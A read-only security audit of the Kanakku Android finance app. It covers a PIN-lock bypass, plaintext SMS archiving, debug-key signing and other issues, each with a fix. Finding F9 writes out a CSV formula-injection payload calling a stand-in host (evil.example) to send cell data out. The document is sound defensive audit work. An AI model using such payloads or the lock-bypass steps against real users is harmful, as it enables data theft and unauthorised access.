# Kanakku — Security Audit (read-only)

**Date:** 2026-10-29 · **Scope:** `~/workspace/kanakku-project` @ `1ddf836` (app v1.1.3) — Flutter/Dart (`app/lib`, `parser/lib`) + Kotlin native (`app/android`). **Method:** manual code review of manifest, native capture/PIN/share layer, Dart stores, backup/export/import paths, build config. No files were modified. No dynamic/on-device testing was performed; every finding is grounded in cited code.

**Threat model used for ranking:** a sideloaded personal-finance app holding READ_SMS + notification-access on the owner's phone. Realistic adversaries: (a) a person holding the unlocked phone for a minute, (b) backup/transfer/forensic extraction of app data, (c) a tampered "update" APK, (d) hostile content the app ingests (SMS, notifications, CSV files). Network attackers are out of scope — the app has no network surface at all (see Sound list #1).

---

## Findings

### F1 — HIGH — App lock is bypassable in under a minute: 5 wrong PINs unlock the "Reset lock" escape hatch, and no attempt throttling exists anywhere

- **Where:** `app/lib/pin.dart` (`LockGate`, `maxFailures = 5`); `app/lib/main.dart` `_LockScreenState._resetLock` (~L194–216) → `CaptureService.pinClear()` → `PinStore.clear()`; failure counter is a plain in-memory field (`final _gate = LockGate()` in `_LockScreenState`, `app/lib/pin.dart`).
- **Attack:** Anyone holding the phone opens Kanakku, types any 5 wrong PINs (no delay, no backoff, each attempt is instant), taps **"Forgot PIN? Reset lock"**, confirms the dialog — the PIN is deleted natively and the app opens with full access to every transaction, balance and statement. Total time well under a minute; no identity proof of any kind. Even without the hatch: the counter is **not persisted** (process death resets it), and the other PIN prompts — balance reveal (`main.dart` `_revealBalances`, ~L1619) and Settings change/disable-PIN (~L4581, L4598) — do not count attempts at all and can be reopened indefinitely. A 4–6 digit PIN (10⁴–10⁶ space) is therefore also online-brute-forceable through the UI.
- **Honest assessment:** this is the documented "privacy screen, not strong security" design — but the app presents it as an *App lock*, and a user will reasonably believe a snooping family member, colleague or thief is kept out. They are not.
- **Fix:** Remove the unauthenticated reset, or gate it behind the **device credential** (KeyguardManager/BiometricPrompt) or a long delayed reset (24–72 h with a persistent countdown). Persist the failure counter in `PinStore` and add exponential backoff shared by *all* PIN prompts. Longer-term: offer biometric unlock and a 6-digit minimum.

### F2 — HIGH — Every incoming SMS is archived verbatim — including OTPs and personal messages — in plaintext storage

- **Where:** `app/android/.../SmsReceiver.kt` (stores **all** `SMS_RECEIVED` messages, no sender/content filter); `CaptureStore.kt` `appendSms` → `KEY_SMS`, rolling 500 items; same pattern for notifications (`KEY_NOTIF`, 500 items).
- **Attack / exposure:** The parser (`parser/lib`) discards OTPs and non-transactions for display, but the **native store keeps the full body of every SMS the phone receives** — bank OTPs, 2FA codes, personal chats — as plaintext in `shared_prefs/kanakku_capture.xml`. Anyone who obtains the app-data directory (paths in F3/F4: device-to-device transfer, root, older-Android backup) gets a rolling archive of the user's last ~500 text messages plus ~500 finance-app notifications, long after the messages were deleted from the SMS inbox. This also contradicts the user's mental model ("the app reads *bank* SMS"): a message from a friend is archived identically.
- **Fix:** Filter before persisting: run the parser (or at least the bank-sender/amount heuristics) in the receiver and store **only** messages that parse into a transaction/bill, ideally storing the parsed fields rather than the raw body. Purge non-matching captures on next launch for existing installs. Reduce the retention cap and/or add age-based expiry.

### F3 — MEDIUM — All financial data at rest is plaintext; no Keystore-backed encryption anywhere

- **Where:** `CaptureStore.kt` and `PinStore.kt` — `getSharedPreferences(..., MODE_PRIVATE)`, plain XML on disk: manual entries, imported **bank-statement rows with balances**, splits (incl. counterparty names), budgets, settings (incl. profile/display name), daily-summary text, PIN hash+salt.
- **Attack:** MODE_PRIVATE stops other *unprivileged apps* only. It does nothing against root/forensic extraction, OEM transfer tooling, or the backup paths in F4. For an app whose entire purpose is a financial ledger, the data layer has the same protection as a notes app.
- **Fix:** Move the stores to `EncryptedSharedPreferences` (Jetpack Security) or encrypt each JSON document with an AES-GCM key held in Android Keystore before writing. The manual store already does synchronous `commit()` writes (v1.0.1), so the integration points are small.

### F4 — MEDIUM — Backup / device-transfer rules are undeclared, so platform defaults silently carry the data

- **Where:** `app/android/app/src/main/AndroidManifest.xml` — `<application>` declares **no** `android:allowBackup`, **no** `android:dataExtractionRules` (API 31+), **no** `android:fullBackupContent` (≤ API 30).
- **Exposure by platform:** Target SDK follows current Flutter (≥ 31), which limits the worst cases on modern phones (`adb backup` refuses target-31+ apps; Google cloud backup is opt-in without rules). Two real paths remain:
  1. **Device-to-device transfer** (Pixel migration, Samsung Smart Switch, OEM cloners) **includes app data by default** — the full plaintext store *and* the F2 SMS archive move to a new device with no prompt and no user awareness.
  2. On **Android 7–11** installs (minSdk is 24, so these are supported), the legacy defaults apply in full: Auto Backup uploads `shared_prefs` to the user's Google Drive, and `adb backup` works — either yields the complete ledger plus the PIN hash (see F6).
- **Fix:** Ship `res/xml/data_extraction_rules.xml` + `fullBackupContent` excluding the capture/pin stores from cloud backup *and* D2D — or simply `android:allowBackup="false"`. Kanakku already has its own in-app backup/restore (F5), so disabling platform backup costs the user nothing.

### F5 — MEDIUM — The backup export is an unencrypted file containing the user's entire financial history

- **Where:** `app/lib/backup.dart` (`buildBackup`), shared via `shareBytes` in `app/lib/main.dart` `_doBackup` (~L914–940).
- **Verified good news first:** the long-standing claim holds — the PIN, its hash and its salt are **never** in the backup. `backupStoreKeys` covers only manual/removed/splits/budgets/statement/categories, the settings document contains no secrets, and the method channel exposes no call that returns the hash or salt (`pinIsSet/pinSet/pinVerify/pinClear` only).
- **The problem:** the file is still plaintext JSON holding *everything else* — full manual + imported-statement transaction history, budgets, categories/merchant rules, profile name, and **split bills with other people's names and amounts owed**. It is designed to be sent through WhatsApp/Drive/email share sheets, after which it lives outside any access control, forever, in chat backups and cloud drives.
- **Fix:** Offer (or default to) passphrase-encrypted backups — derive a key from a user passphrase (PBKDF2/Argon2) and AES-GCM-encrypt the JSON before sharing; restore prompts for the passphrase. At minimum, warn in the backup UI that the file is unencrypted and readable by anyone who gets it.

### F6 — MEDIUM — Release builds are signed with the Android debug key

- **Where:** `app/android/app/build.gradle.kts` — `release { signingConfig = signingConfigs.getByName("debug") }` (the file's own comment admits it).
- **Attack:** Update integrity for a sideloaded app rests entirely on the signing key: Android will install any same-signer APK as an "update", inheriting permissions (READ_SMS, notification access) and all stored data. The debug keystore uses the well-known password `android` and sits unprotected in the build environment's SDK directory — anyone who obtains that one file (or compromises the build VM) can sign a malicious Kanakku "update" that users will accept without any warning. It also makes Play Store distribution impossible.
- **Fix:** Generate a dedicated release keystore, store it offline with a strong password (ideally in the Secure Vault), and sign releases with it. Note for users: switching keys requires one uninstall/reinstall — the in-app backup makes that painless if done *before* the switch.

### F7 — MEDIUM — PIN verifier is a single round of SHA-256 over a 4–6 digit secret: instant offline brute force

- **Where:** `PinStore.kt` `hash()` — `SHA-256("$saltHex:$pin")`, one iteration. PIN policy: 4–6 digits (`app/lib/pin.dart` `isValidPinFormat`).
- **Attack:** If the hash+salt are extracted (F3/F4 paths), the entire candidate space is ≤ 10⁶; a single SHA-256 round means a laptop GPU exhausts it in well under a second. The 16-byte `SecureRandom` salt (correctly generated, and `verify()` uses constant-time `MessageDigest.isEqual` — both good) defeats rainbow tables but cannot rescue a 10⁴–10⁶ space without a work factor.
- **Fix:** PBKDF2-HMAC-SHA256 with ≥ 100,000 iterations (or scrypt/Argon2id). Note this only hardens the *verifier*; the PIN encrypts no data (F1/F3) — if the lock is ever meant to protect data at rest, derive an encryption key from the PIN instead.

### F8 — LOW — No FLAG_SECURE: balances leak through recents thumbnails, screenshots and screen recording

- **Where:** `MainActivity.kt` never sets `WindowManager.LayoutParams.FLAG_SECURE` (no occurrence anywhere in Kotlin or Dart).
- **Exposure:** After the app is backgrounded, the Android recents card displays live balances/transactions; any screenshot or screen-recording (including by another app the user grants capture to) captures the unlocked app. The 60-second re-lock does not remove the stored thumbnail. Every mainstream banking app sets this flag.
- **Fix:** Set FLAG_SECURE on the MainActivity window — ideally tied to the app-lock/balance-privacy setting so users who want screenshots can opt out knowingly.

### F9 — LOW — CSV formula injection in transaction exports

- **Where:** `app/lib/csv_export.dart` `_esc()` — quoting is RFC-4180-correct, but cells are never neutralised for leading `=`, `+`, `-`, `@`, tab or CR.
- **Attack:** Labels/categories come from SMS counterparty text, **imported statement narrations** and custom user labels. A cell like `=HYPERLINK("https://evil.example/?"&A2,"open")` or a DDE payload survives import → export and is evaluated when the victim opens the CSV in Excel/Google Sheets. Realistic chain: someone is sent a "bank statement" CSV, imports it into Kanakku, later exports and opens the result in Sheets.
- **Fix:** In `_esc`, prefix any cell starting with `= + - @ \t \r` with a single quote. (The PDF export is not affected — see Sound #8.)

### F10 — LOW — Statement picker reads the whole file into RAM before checking the 5 MB cap (on the main thread)

- **Where:** `MainActivity.kt` `onActivityResult` (~L246): `openInputStream(uri)?.use { it.readBytes() }`, *then* `bytes.size > 5 * 1024 * 1024` → `too_large`.
- **Exposure:** A hostile or broken document provider (or a genuinely huge file) is fully buffered in memory first — an out-of-memory crash is the failure mode, and the read happens synchronously in `onActivityResult`, risking an ANR on slow providers. The file is user-picked, so this is a robustness/DoS issue, not a compromise.
- **Fix:** Stream with a counting cap (abort past 5 MB + 1 byte) on a background thread. Note the picker itself is otherwise well-chosen: `ACTION_OPEN_DOCUMENT`, one-shot read, **no** persistable URI grant taken.

### F11 — LOW — Notification capture is broader than "banking" and can be used to inject fake transactions

- **Where:** `KanakkuNotificationListener.kt` — the allowlist additionally matches **any** package whose name *contains* `bank`, `upi`, `pay` or `wallet`, and explicitly includes Amazon, Uber, Swiggy and Zomato; full title + body text is archived (500 items).
- **Issues:** (a) *Privacy* — food/order/travel notifications are stored verbatim alongside finance data. (b) *Integrity* — any app with a matching package name can post a notification reading "Rs. 5,000.00 debited from your A/c…" and Kanakku will ingest it as a genuine transaction (the parser needs only plausible text), polluting the ledger, budgets and summaries. Money never moves and entries are removable, so impact is bounded — but it undermines trust in the records, and a crafted alert could be used to scare/social-engineer the user.
- **Fix:** Use a strict package allowlist (drop the substring heuristics and non-finance apps), or visually quarantine transactions whose source package is not allowlisted.

### F12 — LOW — Daily-summary notification exposes amounts on the lock screen

- **Where:** `SummaryNotifier.kt` `post()` — the notification text is the literal summary ("Today ₹X · Month ₹Y") and no `setVisibility(...)` is set.
- **Exposure:** Under default Android settings, notification content is shown on the lock screen; anyone glancing at the locked phone learns the day's and month's spend totals. All `PendingIntent`s correctly use `FLAG_IMMUTABLE`, so this is purely a content-visibility issue.
- **Fix:** `setVisibility(Notification.VISIBILITY_SECRET)` (or a redacted public version: "Open Kanakku for today's summary"); consider honouring the balance-privacy setting.

### F13 — INFO — The app lock fails open if the platform channel is slow

- **Where:** `app/lib/main.dart` `_AppGateState._check()` (~L102–114): if `pinIsSet()` doesn't answer within 2 s it is treated as "no PIN set" and the Shell opens unlocked.
- **Assessment:** Deliberate anti-lockout design, and on a healthy device the channel answers in milliseconds — but a security control that silently disables itself on a timeout is worth recording. The surrounding lifecycle logic is otherwise sound: cold start always begins locked when a PIN is set, backgrounding > 60 s re-locks on resume, and the Flutter activity's handled `configChanges` mean rotation doesn't recreate the gate. (The attempt-counting gap is F1.)

### F14 — INFO — Export files accumulate in the cache after sharing

- **Where:** `MainActivity.kt` `shareCsv`/`shareBytes` write into `cacheDir/exports/` and never clean up; each backup JSON (F5's full-history file) and every CSV/PDF export persists there.
- **Assessment:** The directory is app-private and the `FileProvider` config is correctly minimal (`res/xml/file_paths.xml` exposes *only* `exports/`; provider `exported=false`; read grants are per-share-intent; filenames are app-generated constants — no user input reaches the path, so no traversal). The residual issue is only defence-in-depth: multiple full-history copies linger until the OS reclaims cache.
- **Fix:** Delete prior exports before writing a new one, or clean the folder on app start.

### F15 — INFO — Backup restore validates shape only (user-mediated, data-only impact)

- **Where:** `app/lib/backup.dart` `parseBackup` + `app/lib/main.dart` `_doRestore` (~L944+).
- **Assessment:** A backup file from anyone else replaces the entire ledger after the user picks it and confirms a clear "replaces ALL current data" dialog. Restored payloads are only ever re-parsed as data (no code path executes file content), so the worst case is fabricated financial records, not compromise. Acceptable for a personal app; an optional backup passphrase (F5) would authenticate files too.

### F16 — INFO — BootReceiver is exported — correctly, and safely

- **Where:** `AndroidManifest.xml` — `BootReceiver exported=true` with a `BOOT_COMPLETED` filter and no permission.
- **Assessment:** `BOOT_COMPLETED` is a protected broadcast that only the system can send, the receiver must be exported for the system to reach it, and all it does is re-arm the summary alarm when the feature is on. Same pattern as `SmsReceiver` (exported, correctly guarded by the signature-level `BROADCAST_SMS` permission). No change needed — recorded so a future reviewer doesn't "fix" it into a broken state.

---

## Checked and found SOUND (no finding)

1. **No network surface at all.** The release `AndroidManifest.xml` requests **no** `INTERNET` permission (it appears only in the dev-only debug/profile manifests), and there is no HTTP client, socket, WebView or URL-launcher usage anywhere in `app/lib`, `parser/lib` or the Kotlin code. The app cannot exfiltrate data over the network; every egress is a user-invoked share sheet.
2. **No sensitive logging.** Zero `print`/`debugPrint` calls in Dart production code and zero `android.util.Log` in Kotlin — no SMS bodies, amounts or PINs can leak via logcat.
3. **PIN handling hygiene (storage side).** The PIN is never stored in plaintext or in Dart; the salt is 16 bytes from `SecureRandom`, per-install; verification uses constant-time `MessageDigest.isEqual`. (The weaknesses are the work factor — F7 — and the bypass — F1 — not the storage mechanics.)
4. **Backup excludes PIN material — verified.** See F5: neither hash nor salt can reach a backup through any channel method. The v1.0 claim is true.
5. **Method channel is not an IPC hole.** `in.kanakku/capture` is an in-process Flutter channel; other apps cannot invoke it. `MainActivity` registers no deep links and reads no intent extras; the only exported activity is the launcher activity, as required.
6. **Component exposure is correct.** Notification listener: `exported=false` + `BIND_NOTIFICATION_LISTENER_SERVICE`. Daily-summary receiver: `exported=false`. FileProvider: `exported=false`, paths limited to the exports cache. All `PendingIntent`s use `FLAG_IMMUTABLE`. Alarm uses `setAndAllowWhileIdle` — no exact-alarm permission overreach.
7. **Document picker hygiene.** `ACTION_OPEN_DOCUMENT` — no broad storage permission requested; the URI grant is used once and never persisted. (The read-then-cap flaw is F10.)
8. **PDF export escaping.** `pdf_export.dart` `_escPdf` backslash/octal-escapes all structural and non-ASCII characters; merchant text cannot break out of a PDF literal string or corrupt the document structure.
9. **CSV import parser robustness.** `statement.dart` uses `double.tryParse` throughout, skips unparseable rows, guards `int.parse` behind digit-only regex matches, and tolerates malformed files without crashing. Personal merchant rules (`categories.dart`) match by substring `contains` — no user-controlled regex, so no ReDoS; parser regexes run on SMS-length strings only.
10. **Supply chain is minimal.** `app/pubspec.yaml`: Flutter SDK + `cupertino_icons` + the first-party parser package (dev-only `flutter_lints`); the parser package has zero runtime dependencies. No analytics, ads or third-party SDKs. (The exception is signing — F6.)
11. **Danger-zone wipe actually wipes.** `wipeAll` clears every CaptureStore key and the PIN store (`CaptureStore.clearAll` + `PinStore.clear`).
12. **Settings document contains no secrets** — display name and UI preferences only (its travel inside backups is covered by F5).

---

## Top 3 fixes to do first

1. **Make the app lock mean something (F1 + F7).** Remove or device-credential-gate the Reset-lock hatch, persist the failure counter with backoff across *all* PIN prompts, and switch the verifier to PBKDF2 (≥ 100k iterations). Until then, tell users plainly in the Settings copy that the lock is a privacy screen.
2. **Stop archiving raw messages, and encrypt what's kept (F2 + F3).** Filter in `SmsReceiver`/the listener so only parseable finance messages persist (fields, not bodies), purge legacy non-matching captures, and move the stores behind a Keystore-held AES-GCM key (`EncryptedSharedPreferences`).
3. **Close the silent egress paths (F4 + F5).** Declare data-extraction rules (or `allowBackup="false"`) excluding the stores from cloud backup and device transfer, and offer passphrase-encrypted backups so the file users share into WhatsApp/Drive isn't a plaintext copy of their financial life.

*Close fourth:* generate a real release keystore and stop shipping debug-signed builds (F6) — an afternoon's work that protects every future update.
